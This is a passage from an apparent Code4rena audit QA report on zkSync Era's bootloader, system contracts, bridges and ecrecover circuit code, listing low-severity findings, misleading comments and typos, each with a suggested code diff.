            params.l2GasPrice = _isFree ? 0 : _deriveL2GasPrice(tx.gasprice, _l2GasPerPubdataByteLimit);
            uint256 baseCost = params.l2GasPrice * _l2GasLimit;
```

Defaults to:

```solidity
            params.l2GasPrice = _deriveL2GasPrice(tx.gasprice, _l2GasPerPubdataByteLimit);
            uint256 baseCost = params.l2GasPrice * _l2GasLimit;
```

Taking into account that its value can never be zero because:

```solidity
      function _deriveL2GasPrice(uint256 _l1GasPrice, uint256 _gasPricePerPubdata) internal pure returns (uint256) {
            uint256 pubdataPriceETH = L1_GAS_PER_PUBDATA_BYTE * _l1GasPrice;
            uint256 minL2GasPriceETH = (pubdataPriceETH + _gasPricePerPubdata - 1) / _gasPricePerPubdata;
            
            return Math.max(FAIR_L2_GAS_PRICE, minL2GasPriceETH);
      }
```

This returns at least `FAIR_L2_GAS_PRICE`. If we go to [bootloader, function `processL1Tx`](https://github.com/code-423n4/2023-10-zksync/blob/c3ff020df5d11fe91209bd99d7fb0ec1272dc387/code/system-contracts/bootloader/bootloader.yul#L878C1-L951C18), the `refundGas` the user will receive is the sum of:

*Note: please see calculation in warden's [original submission](https://github.com/code-423n4/2023-10-zksync-findings/issues/548).*

`reservedGas` is the excess of gas between what the user provided and what the operator is willing to use, and `refundGas` (not the final one) is the remaining gas that is left after preparing and executing the requested transaction. It is expected then that `_refundRecipient` will receive `refundGas * gasPrice` as a compensation for providing more gas than the needed for the execution of the `L1⇒L2` transaction.

However, we see in:

[Mailbox, lines 929 to 932](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L929C1-L932C45)

```solidity
                // Note, that for now, the `L1->L2` transactions are free, i.e. the gasPrice
                // for such transactions is always zero, so the `refundGas` is not used anywhere
                // except for notifications for the operator for API purposes. 
                notifyAboutRefund(refundGas)
```

It is never used, as it assumes that "L1⇒L2 transactions are free", which is not true. If the transaction does not revert, then `_refundRecipient` will receive:

[bootloader, line 950](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L950)

```solidity
                    toRefundRecipient := safeSub(getReserved0(innerTxDataOffset), safeAdd(getValue(innerTxDataOffset), payToOperator, "kpa"), "ysl")
```

This equals to `msg.value - (l2Value + payToOperator)`. I kindly suggest changing the code to:

[bootloader, lines 929 to 952](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L929C1-L952C1)

```diff
-               // Note, that for now, the `L1->L2` transactions are free, i.e. the gasPrice
-               // for such transactions is always zero, so the `refundGas` is not used anywhere
-               // except for notifications for the operator for API purposes. 
                notifyAboutRefund(refundGas)

                // Paying the fee to the operator
                mintEther(BOOTLOADER_FORMAL_ADDR(), payToOperator, false)

                let toRefundRecipient
                switch success
                case 0 {
                    // If the transaction reverts, then minting the msg.value to the user has been reverted
                    // as well, so we can simply mint everything that the user has deposited to 
                    // the refund recipient

                    toRefundRecipient := safeSub(getReserved0(innerTxDataOffset), payToOperator, "vji")
                }
                default {
-                   // If the transaction succeeds, then it is assumed that msg.value was transferred correctly. However, the remaining 
-                   // ETH deposited will be given to the refund recipient.
+                   // If the transaction succeeds, then it is assumed that msg.value was transferred correctly, so refundGas is 
+                   // sent to the refund recipient.

-                   toRefundRecipient := safeSub(getReserved0(innerTxDataOffset), safeAdd(getValue(innerTxDataOffset), payToOperator, "kpa"), "ysl")
+                   toRefundRecipient := safeMul(refundGas, gasPrice, "whatever error you want")
                }
```

If both equations are equal, that is, `refundGas * gasPrice = msg.value - (l2Value + payToOperator)`, then this is more explicit and saves gas by not doing `safeSub`s nor `safeAdd`s (QA). If they are **NOT**, then this code is the correct one, as you are giving the refund recipient exactly the calculated `refundGas`, no more, no less.

## [11] It is possible to refund a single transaction more than `2³² - 1` gas, whilst the bootloader only has that amount of gas available for a given batch

The bootloader is provided with `2³² - 1` gas to execute all submitted transactions in a given batch, so it is expected that all the gas refunds will be below that amount. For L2 transactions, it is checked in:

[bootloader, lines 1463 to 1465](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1463C1-L1465C18)

```solidity
                if iszero(validateUint32(refundInGas)) {
                      assertionError("refundInGas is not uint32")
                }
```

But for `L1⇒L2` transactions it is not enforced, leading to a possible situation in which the operator refunds, or even pay himself, more than what the bootloader really has. Consider doing in:

[bootloader, line 926](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L926)

```diff

                if gt(refundGas, gasLimit) {
                    assertionError("L1: refundGas > gasLimit")
                }

+               if iszero(validateUint32(refundInGas)) {
+                   assertionError("refundInGas is not uint32")
+               }

                let payToOperator := safeMul(gasPrice, safeSub(gasLimit, refundGas, "lpah"), "mnk")
```

## [12] Useless `max` pick

In [bootloader, line 1456](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1456), it is being picked the maximum between the refund provided by the operator and the one calculated by the bootloader plus the initial excess of gas. As `askOperatorForRefund` is called with the leftover gas found by the bootloader, it will return a value less than `reservedGas + gasLeft` so the `max` function is broken. Consider doing the same as in:

[bootloader, lines 914 to 921](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L914C1-L921C57)

```solidity
                    // Asking the operator for refund
                    askOperatorForRefund(potentialRefund)
                    
                    // In case the operator provided smaller refund than the one calculated
                    // by the bootloader, we return the refund calculated by the bootloader.
                    refundGas := max(getOperatorRefundForTx(transactionIndex), potentialRefund)
                    }
                    
                refundGas := add(refundGas, reservedGas)
```

That is, rewrite:

[bootloader, lines 1450 to 1456](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1450C1-L1456C90)

```diff
               askOperatorForRefund(gasLeft)

               let operatorProvidedRefund := getOperatorRefundForTx(transactionIndex)

               // If the operator provides the value that is lower than the one suggested for 
               // the bootloader, we will use the one calculated by the bootloader.
-              let refundInGas := max(operatorProvidedRefund, add(reservedGas, gasLeft))
+              let refundInGas := max(operatorProvidedRefund, gasLeft)
+              refundInGas := add(reservedGas, refundInGas)
```

## [13] Misleading comment 

In [Executor, line 440](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L440)

```solidity
                bytes32(0) // zkPorter batch hash
```

it says *"zkPorter batch HASH"*, so it seems it should be:

```diff
-                bytes32(0) // zkPorter batch hash
+                EMPTY_STRING_KECCAK // zkPorter batch hash
```

## [14] Lower-bound the minimum execution delay in `ValidatorTimelock`

[ValidatorTimelock, function `setExecutionDelay`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/ValidatorTimelock.sol#L59C1-L62C6)

```diff
+   uint32 MIN_EXECUTION_DELAY = uint32(1 hours); // whatever

    function setExecutionDelay(uint32 _executionDelay) external onlyOwner {
+       require(_executionDelay >= MIN_EXECUTION_DELAY, "Don't do that");
        executionDelay = _executionDelay;
        emit NewExecutionDelay(_executionDelay);
    }
```

## [15] Wrong logic

Both [Utils, function `bytecodeLenInWords`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/libraries/Utils.sol#L46) and [L2ContractHelper, function `_bytecodeLen`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/common/libraries/L2ContractHelper.sol#L50) do calculate the length in words of a given bytecode like the following:

```solidity
        codeLengthInWords = uint256(uint8(_bytecodeHash[2])) * 256 + uint256(uint8(_bytecodeHash[3]));
```

However, when hashing the bytecode, the bytes at position `[2]` are set to `0`:

```solidity
    function hashL2Bytecode(bytes memory _bytecode) internal pure returns (bytes32 hashedBytecode) {

        ...

        hashedBytecode = sha256(_bytecode) & 0x00000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;
        // Setting the version of the hash
        hashedBytecode = (hashedBytecode | bytes32(uint256(1 << 248)));
        // Setting the length
        hashedBytecode = hashedBytecode | bytes32(bytecodeLenInWords << 224);
    }
```

It seems that `codeLengthInWords` should be equal to the bytes at position `[3]` alone, as the variable's name `bytecodeLenInWords` suggests, that is:

[L2ContractHelper, function `_bytecodeLen`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/common/libraries/L2ContractHelper.sol#L49C1-L51C6)

```diff
    function _bytecodeLen(bytes32 _bytecodeHash) private pure returns (uint256 codeLengthInWords) {
-       codeLengthInWords = uint256(uint8(_bytecodeHash[2])) * 256 + uint256(uint8(_bytecodeHash[3]));
+       codeLengthInWords = uint256(uint8(_bytecodeHash[3]));
    }
```

[Utils, function `bytecodeLenInWords`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/libraries/Utils.sol#L44C1-L48C6)

```diff
    function bytecodeLenInWords(bytes32 _bytecodeHash) internal pure returns (uint256 codeLengthInWords) {
        unchecked {
-           codeLengthInWords = uint256(uint8(_bytecodeHash[2])) * 256 + uint256(uint8(_bytecodeHash[3]));
+           codeLengthInWords = uint256(uint8(_bytecodeHash[3]));
        }
    }
```

## [16] If `_enumerationIndexSize` is `0`, `compressedEnumIndex` equals `metadata`

In [Compressor, lines 175 to 177](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/Compressor.sol#L175C1-L179C81):

```solidity
            uint256 compressedEnumIndex = _sliceToUint256(_compressedStateDiffs[stateDiffPtr:stateDiffPtr + _enumerationIndexSize]);
            require(enumIndex == compressedEnumIndex, "rw: enum key mismatch");
            stateDiffPtr += _enumerationIndexSize;
            
            uint8 metadata = uint8(bytes1(_compressedStateDiffs[stateDiffPtr]));
```

If `_enumerationIndexSize` is zero, then `compressedEnumIndex` and `metadata` will have the same value, as `stateDiffPtr += 0` equals `stateDiffPtr`.

[Compressor, lines 117 to 126](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/Compressor.sol#L117C1-L126C109)

```diff
    function verifyCompressedStateDiffs(
        uint256 _numberOfStateDiffs,
        uint256 _enumerationIndexSize,
        bytes calldata _stateDiffs,
        bytes calldata _compressedStateDiffs
    ) external payable onlyCallFrom(address(L1_MESSENGER_CONTRACT)) returns (bytes32 stateDiffHash) {
        // We do not enforce the operator to use the optimal, i.e. the minimally possible _enumerationIndexSize. 
        // We do enforce however, that the _enumerationIndexSize is not larger than 8 bytes long, which is the 
        // maximal ever possible size for enumeration index.
+       require(_enumerationIndexSize != 0, "whatever");
        require(_enumerationIndexSize <= MAX_ENUMERATION_INDEX_SIZE, "enumeration index size is too large");

        ...
```

## [17] Tautology in `publishPubdataAndClearState`

In [L1Messenger, function `publishPubdataAndClearState`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/L1Messenger.sol#L206) there is a tautology:

```solidity
        require(numberOfL2ToL1Logs <= numberOfL2ToL1Logs, "Too many L2->L1 logs");
```

As `numberOfL2ToL1Logs <= numberOfL2ToL1Logs` always holds, it can pass more logs than `numberOfLogsToProcess`. However, the correctness of the amount of sent logs is also checked in

[Executor, lines 166 to 170](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L166C1-L170C10)

```solidity
        if (_expectedSystemContractUpgradeTxHash == bytes32(0)) {
            require(processedLogs == 127, "b7");
        } else {
            require(processedLogs == 255, "b8");
        }
```

NOTE: I did not test it, but it seems it lets the door open for the operator to add an additional log to the queue if there was a system upgrade, so that the first condition reverts, which may be considered as a temporal DOS/griefing. Consider changing to:

```diff
-        require(numberOfL2ToL1Logs <= numberOfL2ToL1Logs, "Too many L2->L1 logs");
+        require(numberOfL2ToL1Logs <= numberOfLogsToProcess, "Too many L2->L1 logs");
```

## [18] Chaining hashes with the wrong initial value

Usually, when we want to chain hashes one after another we start with the empty string hash and then hash the rest by encoding one after another like `"" || str1 || str2 || ...` and hashing them in pairs. However, in many places it is used `0` as the initial *"string"* which may lead to issues as some of your contracts in L1 do use `EMPTY_STRING_KECCAK` instead, namely

[Executor, function `_collectOperationsFromPriorityQueue`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L260C1-L267C6)

```solidity
    function _collectOperationsFromPriorityQueue(uint256 _nPriorityOps) internal returns (bytes32 concatHash) {
        concatHash = EMPTY_STRING_KECCAK;

        for (uint256 i = 0; i < _nPriorityOps; i = i.uncheckedInc()) {
            PriorityOperation memory priorityOp = s.priorityQueue.popFront();
            concatHash = keccak256(abi.encode(concatHash, priorityOp.canonicalTxHash));
        }
    }
```

In the future, it seems there will be more. On the other hand, there are some places which do not follow this:

[L1Messenger, line 210](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/L1Messenger.sol#L210)

```solidity
        bytes32 reconstructedChainedLogsHash; // defaults to bytes32(0)
```

[L1Messenger, line 240](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/L1Messenger.sol#L240)

```solidity
        bytes32 reconstructedChainedMessagesHash; // defaults to bytes32(0)
```

[L1Messenger, line 258](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/L1Messenger.sol#L258)

```solidity
        bytes32 reconstructedChainedL1BytecodesRevealDataHash; // defaults to bytes32(0)
```

[L1Messenger, lines 331 to 335](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/L1Messenger.sol#L331C1-L335C55)

```solidity
        /// Clear logs state
chainedLogsHash = bytes32(0);
numberOfLogsToProcess = 0;
chainedMessagesHash = bytes32(0);
chainedL1BytecodesRevealDataHash = bytes32(0);
```

[SystemContext, line 293](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/SystemContext.sol#L293)

```solidity
        currentL2BlockTxsRollingHash = bytes32(0);
```

Consider changing them to `EMPTY_STRING_KECCAK`.

## [19] Wrong initialisation of the zero point

In [ecrecover/secp256k1/mod.rs, lines 147 to 153](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/ecrecover/secp256k1/mod.rs#L147C1-L153C6) is wrong:

```solidity
    fn zero() -> Self {
        PointAffine {
            x: Fq::zero(),
            y: Fq::one(),
            infinity: true,
        }
    }
````

As `is_zero` is defined like:

```solidity

    fn is_zero(&self) -> bool {
        self.infinity
    }
```

Also, `self.infinity` is toggled up when `self.x` = `self.y` = `0`:

[ecrecover/secp256k1/mod.rs, lines 189 to 211](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/ecrecover/secp256k1/mod.rs#L189C1-L211C6)

```solidity
    fn from_xy_unchecked(x: Self::Base, y: Self::Base) -> Self {
        let infinity = x.is_zero() && y.is_zero();
        Self {
            x: x,
            y: y,
            infinity,
        }
    }

    fn from_xy_checked(x: Self::Base, y: Self::Base) -> Result<Self, GroupDecodingError> {
        let infinity = x.is_zero() && y.is_zero();
        let affine = Self {
            x: x,
            y: y,
            infinity,
        };

        if !affine.is_on_curve() {
            Err(GroupDecodingError::NotOnCurve)
        } else {
            Ok(affine)
        }
    }
```

I'm putting it as a Low as it may be some weird math thing, but the zero element in all *"math-things"* is defined as the one that makes:

*Note: please see calculation in warden's [original submission](https://github.com/code-423n4/2023-10-zksync-findings/issues/548).*

Having two *"zero-elements"* is definetly wrong. If I am right, then it may be a High as some [functions like `eq`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/ecrecover/secp256k1/mod.rs#L47C1-L86C2) or [`is_on_curve`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/ecrecover/secp256k1/mod.rs#L124C1-L139C6) would return true for both.

*Note: please see scenario in warden's [original submission](https://github.com/code-423n4/2023-10-zksync-findings/issues/548).*

I can't give you a solution, as I do not know which one is the right point, as in some places it says it is the `(0, 0)` and in others say it is `(0, 1)`.

## [20] Rogue validators can spam `revertBlocks` and make the chain unusable

In [Executor, function `revertBlocks`](https://github.com/matter-labs/era-contracts/blob/f06a58360a2b8e7129f64413998767ac169d1efd/ethereum/contracts/zksync/facets/Executor.sol#L440C1-L456C6) there is no way to prevent a rogue validator to spam this function and DOS other validators from executing the commited batches, as [executeBlocks](https://github.com/matter-labs/era-contracts/blob/f06a58360a2b8e7129f64413998767ac169d1efd/ethereum/contracts/zksync/facets/Executor.sol#L294C14-L294C27) has a delay enforced by [ValidatorTimelock](https://github.com/matter-labs/era-contracts/blob/f06a58360a2b8e7129f64413998767ac169d1efd/ethereum/contracts/zksync/ValidatorTimelock.sol#L109C1-L109C111), which is supposed to be non-zero. As the validator is currently controlled by Matter Labs, I'm putting it as a Low but consider implementing a delay or a slashing mechanism to validators that try to abuse their privileges by spamming `revertBlocks` for batches that do not benefit them, or even try to DOS the network.

## [21] Unnecessary comments

- [contracts/zksync/contracts/Dependencies.sol](https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/zksync/contracts/Dependencies.sol) - not used anywhere.
- [system-contracts/bootloader/bootloader.yul, line 862](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/bootloader/bootloader.yul#L862) - out of place.

## [22] Missing comments

- [ContractDeployer, line 307](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/ContractDeployer.sol#L307C17-L307C45) - what ensures?
- [bootloader, line 1562](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/bootloader/bootloader.yul#L1562C17-L1562C54) - the end of the comment is missing.
- [SystemContractHelper, lines 170 and 173](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/libraries/SystemContractHelper.sol#L173) - add the [ones being developed by lambdaclass](https://github.com/lambdaclass/zksync_era_precompiles#current-status) to that list.

## [23] Typos

[SystemContractHelper, line 347](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/libraries/SystemContractHelper.sol#L347) - `2-bit IS set`, `not 2-bit it set`.

```diff
-        // When the system call is passed, the 2-bit it set to 1
+        // When the system call is passed, the 2-bit is set to 1
```

[KnownCodesStorage, lines 16 to 17](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/KnownCodesStorage.sol#L16C117-L17C10) - repeated `words`.

```diff
- * the second byte denotes whether the contract is constructed, and the next two bytes denote the length in 32-byte words.
- * words. And then the next 28 bytes is the truncated hash.
+ * the second byte denotes whether the contract is constructed, the next two bytes denote the length in 32-byte words
+ * and then the next 28 bytes is the truncated hash.
```

[SystemContext, line 22](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/SystemContext.sol#L22C32-L22C48) - `blocks' hashes`, not `blocks's hashes`.

```diff
-    /// - Store the latest 257 blocks's hashes.
+    /// - Store the latest 257 blocks' hashes.
```

[bootloader, line 38](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/bootloader/bootloader.yul#L38C20-L38C60) - `That means the operator controls ...`, not `That it means that the operator controls ...`.

```diff
-                // That it means that the operator controls
+                // That means the operator controls
```

[bootloader, line 652](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/bootloader/bootloader.yul#L652C57-L652C84) - `... make sure the operator ...`, not `... make sure that the operator`.

```diff
-             /// @dev The purpose of this function is to make sure that the operator
+             /// @dev The purpose of this function is to make sure the operator
```

[bootloader, line 672](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/bootloader/bootloader.yul#L672C32-L672C35) - remove `for`.

```diff
-                     // Calling for the `payForTransaction` method of the account.
+                     // Calling the `payForTransaction` method of the account.
```

[bootloader, line 3164](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/bootloader/bootloader.yul#L3164C22-L3164C39) - `Accepts an uint64`, not `Accepts an uint32`.

```diff
-            /// @dev Accepts an uint32 and returns whether or not it is
+            /// @dev Accepts an uint64 and returns whether or not it is
```

[bootloader, lines 3170 to 3171](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/bootloader/bootloader.yul#L3170C22-L3171C31) - `Accepts an uint128 and returns wether or not it is a valid uint128`, not `Accepts an uint32 and returns wether or not it is a valid uint64`.

```diff
-            /// @dev Accepts an uint32 and returns whether or not it is
-            /// a valid uint64
+            /// @dev Accepts an uint128 and returns whether or not it is
+            /// a valid uint128
```

[keccak256_round_function/mod.rs, lines 87](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/era-zkevm_circuits/src/keccak256_round_function/mod.rs#L87), [88](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/era-zkevm_circuits/src/keccak256_round_function/mod.rs#L88) and [93](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/era-zkevm_circuits/src/keccak256_round_function/mod.rs#L93) - `MEMORY_QUERIES_PER_CYCLE`, not `MEMORY_EQURIES_PER_CYCLE`.

```diff
- pub const MEMORY_EQURIES_PER_CYCLE: usize = 5; // we need to read as much as possible to use a round function every cycle
+ pub const MEMORY_QUERIES_PER_CYCLE: usize = 5; // we need to read as much as possible to use a round function every cycle
- pub const NUM_U64_WORDS_PER_CYCLE: usize = 4 * MEMORY_EQURIES_PER_CYCLE;
+ pub const NUM_U64_WORDS_PER_CYCLE: usize = 4 * MEMORY_QUERIES_PER_CYCLE;
pub const NEW_BYTES_PER_CYCLE: usize = 8 * NUM_U64_WORDS_PER_CYCLE;
// we absorb 136 elements per cycle, and add 160 elements per cycle, so we need to skip memory reads
// sometimes and do absorbs instead
pub const BUFFER_SIZE_IN_U64_WORDS: usize =
-    MEMORY_EQURIES_PER_CYCLE * 4 + KECCAK256_RATE_IN_U64_WORDS - 1;
+    MEMORY_QUERIES_PER_CYCLE * 4 + KECCAK256_RATE_IN_U64_WORDS - 1;
```

[Governance, line 83](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/contracts/ethereum/contracts/governance/Governance.sol#L83) - `both` is for two elements, not three.

```diff
-    /// includes both Waiting, Ready, and Done operations.
+    /// includes Waiting, Ready, and Done operations.
```

[NonceHolder, line 18](https://github.com/code-423n4/2023-10-zksync/blob/c3ff020df5d11fe91209bd99d7fb0ec1272dc387/code/system-contracts/contracts/NonceHolder.sol#L18C29-L18C31) - it is `mark`, not `either marked` as it is a sentence without a replica.

```diff
- * The users can either marked a range of nonces by increasing the `minNonce`. This way all the nonces
+ * The users can mark a range of nonces by increasing the `minNonce`. This way all the nonces
```

[NonceHolder, line 29](https://github.com/code-423n4/2023-10-zksync/blob/c3ff020df5d11fe91209bd99d7fb0ec1272dc387/code/system-contracts/contracts/NonceHolder.sol#L29C42-L29C44) - remove the first `at`.

```diff
-    /// The minNonce can be increased by at 2^32 at a time to prevent it from
+    /// The minNonce can be increased by 2^32 at a time to prevent it from
```

[uma.rs, line 222](https://github.com/code-423n4/2023-10-zksync/blob/c3ff020df5d11fe91209bd99d7fb0ec1272dc387/code/era-zkevm_circuits/src/main_vm/opcodes/uma.rs#L222C12-L222C20) - `Ethereum`, not `Etherium`.

```diff
-    // NB: Etherium virtual machine is big endian;
+    // NB: Ethereum virtual machine is big endian;
```

[cycle.rs, line 504](https://github.com/code-423n4/2023-10-zksync/blob/c3ff020df5d11fe91209bd99d7fb0ec1272dc387/code/era-zkevm_circuits/src/main_vm/cycle.rs#L504C8-L504C11) - `Aux`, not `aux`.

```diff
-    // Axu heap limit
+    // Aux heap limit
```

## [24] Empty error string

In [NonceHolder, line 136](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/NonceHolder.sol#L136C66-L136C68) there should be a non-empty error, as it seems you have some in-house bot that listens to the unique errors emitted by your contracts (all errors are different).

## [25] Wrong comments in L1 bridges

In [L1ERC20Bridge, line 162](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L162C1-L162C115), the comment says `If the L2 deposit finalization transaction fails, the _refundRecipient will receive the _l2Value`. However,

  - There is no such a parameter in the function.
  - As it is an ERC20 transfer, the call to [Mailbox, `requestL2Transaction` made in line 198](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L198) has its argument `_l2Value` hard-coded to `0`, so the comment doesn't make sense.

In [L2ERC20Bridge, line 59](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/contracts/zksync/contracts/bridge/L2ERC20Bridge.sol#L59C1-L59C79), the comment says `@param _l2Receiver The account address that would receive minted ether`. However, the bridge is for ERC20 tokens, not for ETH nor WETH.

## [26] Wrong comment

[secp256k1/mod.rs, line 404](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/ecrecover/secp256k1/mod.rs#L404)

```diff
-                // The two points are equal, so we double.
```

## [27] Wrong comment in `ecrecover/secp256k1/mod.rs`

In [lines 56 to 58](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/era-zkevm_circuits/src/ecrecover/secp256k1/mod.rs#L56C1-L58C40), it is explained how two projective point coordinates are checked against each other to see if both points are equal. However, the comment is wrong, as the formula has switched the places of `Z` and `Z'`:

```diff
        // The points (X, Y, Z) and (X', Y', Z')
-       // are equal when (X * Z^2) = (X' * Z'^2)
-       // and (Y * Z^3) = (Y' * Z'^3).
+       // are equal when (X * Z'^2) = (X' * Z^2)
+       // and (Y * Z'^3) = (Y' * Z^3).
```

## [28] `SystemContext::baseFee` is not a constant, although the comment says it is

The state variable `baseFee` is not a constant, as the keyword `constant` is missing and its value can be changed in `setNewBatch`. Remove that comment.

[SystemContext, line 47](https://github.com/code-423n4/2023-10-zksync/blob/c3ff020df5d11fe91209bd99d7fb0ec1272dc387/code/system-contracts/contracts/SystemContext.sol#L47)

```diff
    /// @notice The `block.basefee`.
-   /// @dev It is currently a constant.
    uint256 public baseFee;
```

## [29] Wrong comment in `Diamond`

The comment `/// NOTE: expect but NOT enforce that _selectors is NON-EMPTY array` is wrong, as it is checked inside [Diamond, function `diamondCut`](https://github.com/code-423n4/2023-10-zksync/blob/c3ff020df5d11fe91209bd99d7fb0ec1272dc387/code/contracts/ethereum/contracts/zksync/libraries/Diamond.sol#L106C1-L106C80):

```solidity
            require(selectors.length > 0, "B"); // no functions for diamond cut
```

Remove them (just do `Ctrl+f` as there are three occurrences).

## [30] Add getters to some variables of `AppStorage`

The variables `zkPorterIsAvaiable`, `totalDepositedAmountPerUser`, `admin` and `pendingAdmin` do not have a proper getter inside the `Getters` facet. Consider adding them.

## [31] `validateUpgradeTransaction` does return as valid non-upgrade transactions

Priority transactions has a type-value of `255` and upgrades `254`, as seen in [bootloader, lines 572 to 591](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L572C1-L591C31). However, `validateUpgradeTransaction`, if all the fields of the `_transaction` are correct, accepts transactions with `txType` field different from `254`, as it is not checked:

```solidity
